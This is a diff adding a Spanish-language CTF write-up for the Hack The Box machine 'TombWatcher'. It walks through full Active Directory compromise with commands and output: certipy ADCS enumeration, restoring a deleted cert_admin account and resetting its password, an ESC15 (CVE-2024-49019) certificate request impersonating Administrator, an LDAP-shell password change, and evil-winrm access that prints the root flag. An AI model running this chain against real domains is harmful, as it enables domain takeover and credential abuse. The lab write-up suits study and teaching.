@@ -363,4 +363,351 @@ cda652ba04f599acc5b87e8152201362
 
 Continuamos con el vector y vamos a aprovechar los privilegios **GenericAll** que tiene john sobre ADCS
 
+Necesitamos enumerar ADCS: 
 
+```bash
+certipy-ad find -u john -p 'Password123!' -target tombwatcher.htb -text -stdout 
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: tombwatcher.htb.
+[!] Use -debug to print a stacktrace
+[*] Finding certificate templates
+[*] Found 33 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 11 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 13 issuance policies
+[*] Found 0 OIDs linked to templates
+[!] DNS resolution failed: The DNS query name does not exist: DC01.tombwatcher.htb.
+[!] Use -debug to print a stacktrace
+[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
+[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[!] Failed to lookup object with SID 'S-1-5-21-1392491010-1358638721-2126982587-1111'
+[*] Enumeration output:
+
+# De los 33 certificados vemos uno con un SID que no puede cargar: 'S-1-5-21-1392491010-1358638721-2126982587-1111'
+...
+
+17
+    Template Name                       : WebServer
+    Display Name                        : Web Server
+    Certificate Authorities             : tombwatcher-CA-1
+    Enabled                             : True
+    Client Authentication               : False
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Extended Key Usage                  : Server Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 1
+    Validity Period                     : 2 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2024-11-16T00:57:49+00:00
+    Template Last Modified              : 2024-11-16T17:07:26+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
+                                          TOMBWATCHER.HTB\Enterprise Admins
+                                          S-1-5-21-1392491010-1358638721-2126982587-1111
+      Object Control Permissions
+        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
+        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
+                                          TOMBWATCHER.HTB\Enterprise Admins
+        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
+                                          TOMBWATCHER.HTB\Enterprise Admins
+        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
+                                          TOMBWATCHER.HTB\Enterprise Admins
+        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
+                                          TOMBWATCHER.HTB\Enterprise Admins
+                                          S-1-5-21-1392491010-1358638721-2126982587-1111
+...
+
+```
+
+Desde la session de evil-winrm buscamos informacion sobre ese SID:
+
+```bash
+*Evil-WinRM* PS C:\Users\john\Documents> Get-ADObject -Filter "objectSid -eq 'S-1-5-21-1392491010-1358638721-2126982587-1111'" -IncludeDeletedObjects -Properties *
+
+
+accountExpires                  : 9223372036854775807
+badPasswordTime                 : 0
+badPwdCount                     : 0
+CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
+                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
+CN                              : cert_admin
+                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
+codePage                        : 0
+countryCode                     : 0
+Created                         : 11/16/2024 12:07:04 PM
+createTimeStamp                 : 11/16/2024 12:07:04 PM
+Deleted                         : True
+Description                     :
+DisplayName                     :
+DistinguishedName               : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
+dSCorePropagationData           : {11/16/2024 12:07:10 PM, 11/16/2024 12:07:08 PM, 12/31/1600 7:00:00 PM}
+givenName                       : cert_admin
+instanceType                    : 4
+isDeleted                       : True
+LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
+lastLogoff                      : 0
+lastLogon                       : 0
+logonCount                      : 0
+Modified                        : 11/16/2024 12:07:27 PM
+modifyTimeStamp                 : 11/16/2024 12:07:27 PM
+msDS-LastKnownRDN               : cert_admin
+Name                            : cert_admin
+                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
+nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                  :
+ObjectClass                     : user
+ObjectGUID                      : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
+objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1111
+primaryGroupID                  : 513
+ProtectedFromAccidentalDeletion : False
+pwdLastSet                      : 133762504248946345
+sAMAccountName                  : cert_admin
+sDRightsEffective               : 7
+sn                              : cert_admin
+userAccountControl              : 66048
+uSNChanged                      : 13197
+uSNCreated                      : 13186
+whenChanged                     : 11/16/2024 12:07:27 PM
+whenCreated                     : 11/16/2024 12:07:04 PM
+
+```
+
+Obtenemos un nombre de usuario: **cert_admin** pero parece ser que es un objeto borrado, por eso el mensaje:
+
+```bash
+[!] Failed to lookup object with SID 'S-1-5-21-1392491010-1358638721-2126982587-1111'
+```
+
+Para usar el objeto debemos restaurarlo, sacamos del CN:
+
+* Restauramos:
+
+```bash
+Restore-ADObject -Identity "938182c3-bf0b-410a-9aaa-45c8e1a02ebf"
+```
+
+* Habilitamos
+
+```bash
+Enable-ADAccount -Identity cert_admin
+```
+
+* Cambiamos el password de **cert_admin**
+
+```bash
+Set-ADAccountPassword -Identity cert_admin -NewPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Reset
+```
+
+* Corroboramos:
+
+```bash
+Get-ADUser -Identity cert_admin
+
+
+DistinguishedName : CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb
+Enabled           : True
+GivenName         : cert_admin
+Name              : cert_admin
+ObjectClass       : user
+ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
+SamAccountName    : cert_admin
+SID               : S-1-5-21-1392491010-1358638721-2126982587-1111
+Surname           : cert_admin
+UserPrincipalName :
+```
+
+Enumeramos ADCS con certypy:
+
+```bash
+certipy-ad find -u cert_admin -p Password123! -dc-ip 10.10.11.72 -target-ip 10.10.11.72 -vulnerable -enable -stdout
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 33 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 11 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 13 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
+[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : tombwatcher-CA-1
+    DNS Name                            : DC01.tombwatcher.htb                                                                                                                                                                              
+    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb                                                                                                                                                       
+    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC                                                                                                                                                                  
+    Certificate Validity Start          : 2024-11-16 00:47:48+00:00                                                                                                                                                                         
+    Certificate Validity End            : 2123-11-16 00:57:48+00:00                                                                                                                                                                         
+    Web Enrollment                                                                                                                                                                                                                          
+      HTTP                                                                                                                                                                                                                                  
+        Enabled                         : False                                                                                                                                                                                             
+      HTTPS                                                                                                                                                                                                                                 
+        Enabled                         : False                                                                                                                                                                                             
+    User Specified SAN                  : Disabled                                                                                                                                                                                          
+    Request Disposition                 : Issue                                                                                                                                                                                             
+    Enforce Encryption for Requests     : Enabled                                                                                                                                                                                           
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy                                                                                                                                                      
+    Permissions                                                                                                                                                                                                                             
+      Owner                             : TOMBWATCHER.HTB\Administrators                                                                                                                                                                    
+      Access Rights                                                                                                                                                                                                                         
+        ManageCa                        : TOMBWATCHER.HTB\Administrators                                                                                                                                                                    
+                                          TOMBWATCHER.HTB\Domain Admins                                                                                                                                                                     
+                                          TOMBWATCHER.HTB\Enterprise Admins
+        ManageCertificates              : TOMBWATCHER.HTB\Administrators
+                                          TOMBWATCHER.HTB\Domain Admins
+                                          TOMBWATCHER.HTB\Enterprise Admins
+        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : WebServer
+    Display Name                        : Web Server
+    Certificate Authorities             : tombwatcher-CA-1
+    Enabled                             : True
+    Client Authentication               : False
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Extended Key Usage                  : Server Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 1
+    Validity Period                     : 2 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2024-11-16T00:57:49+00:00
+    Template Last Modified              : 2024-11-16T17:07:26+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
+                                          TOMBWATCHER.HTB\Enterprise Admins
+                                          TOMBWATCHER.HTB\cert_admin
+      Object Control Permissions
+        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
+        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
+                                          TOMBWATCHER.HTB\Enterprise Admins
+        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
+                                          TOMBWATCHER.HTB\Enterprise Admins
+        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
+                                          TOMBWATCHER.HTB\Enterprise Admins
+        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
+                                          TOMBWATCHER.HTB\Enterprise Admins
+                                          TOMBWATCHER.HTB\cert_admin
+    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
+    [!] Vulnerabilities
+      ESC15                             : Enrollee supplies subject and schema version is 1.
+    [*] Remarks
+      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
+```
+
+[info ESC15 - 1](https://www.hackingarticles.in/adcs-esc15-exploiting-template-schema-v1/)
+[info ESC15 - 2](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu)
+
+Vamos a necesitar para utilizar certipy el SID del usuario Administrator:
+
+```bash
+Get-ADUser -Identity Administrator | Select-Object SID
+
+SID
+---
+S-1-5-21-1392491010-1358638721-2126982587-500
+```
+* Solicitamos el certificado como cert_admin
+
+```bash
+certipy-ad req -dc-ip 10.10.11.72 -u 'cert_admin@tombwatcher.htb' -p 'Password123!' -target-ip 10.10.11.72 -ca 'tombwatcher-CA-1' -template 'WebServer' -upn 'administrator@tombwatcher.htb' -sid 'S-1-5-21-1392491010-1358638721-2126982587-500' -application-policies 'Client Authentication'
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 3
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'administrator@tombwatcher.htb'
+[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
+[*] Saving certificate and private key to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'
+```
+
+* Nos conectamos al shell ldap y cambiamos el password del usuario administrator
+
+```bash
+certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator@tombwatcher.htb'
+[*]     SAN URL SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
+[*]     Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
+[*] Connecting to 'ldaps://10.10.11.72:636'
+[*] Authenticated to '10.10.11.72' as: 'u:TOMBWATCHER\\Administrator'
+Type help for list of commands
+
+# help
+
+ add_computer computer [password] [nospns] - Adds a new computer to the domain with the specified password. If nospns is specified, computer will be created with only a single necessary HOST SPN. Requires LDAPS.
+ rename_computer current_name new_name - Sets the SAMAccountName attribute on a computer object to a new value.
+ add_user new_user [parent] - Creates a new user.
+ add_user_to_group user group - Adds a user to a group.
+ change_password user [password] - Attempt to change a given user's password. Requires LDAPS.
+ clear_rbcd target - Clear the resource based constrained delegation configuration information.
+ disable_account user - Disable the user's account.
+ enable_account user - Enable the user's account.
+ dump - Dumps the domain.
+ search query [attributes,] - Search users and groups by name, distinguishedName and sAMAccountName.
+ get_user_groups user - Retrieves all groups this user is a member of.
+ get_group_users group - Retrieves all members of a group.
+ get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
+ grant_control target grantee - Grant full control of a given target object (sAMAccountName) to the grantee (sAMAccountName).
+ set_dontreqpreauth user true/false - Set the don't require pre-authentication flag to true or false.
+ set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).
+ start_tls - Send a StartTLS command to upgrade from LDAP to LDAPS. Use this to bypass channel binding for operations necessitating an encrypted channel.
+ write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. The gpoSID must be entered surrounding by {}.
+ whoami - get connected user
+ dirsync - Dirsync requested attributes
+ exit - Terminates this session.
+
+# change_password administrator Password123!
+Got User DN: CN=Administrator,CN=Users,DC=tombwatcher,DC=htb
+Attempting to set new password of: Password123!
+Password changed successfully!
+
+# 
+```
+
+* Nos conectamos como administrator con evilwinrm
+
+```bash
+evil-winrm -i 10.10.11.72 -u administrator -p 'Password123!'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
+afaad4dc30de8a7621ec8ca9d4a82f16
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
+```
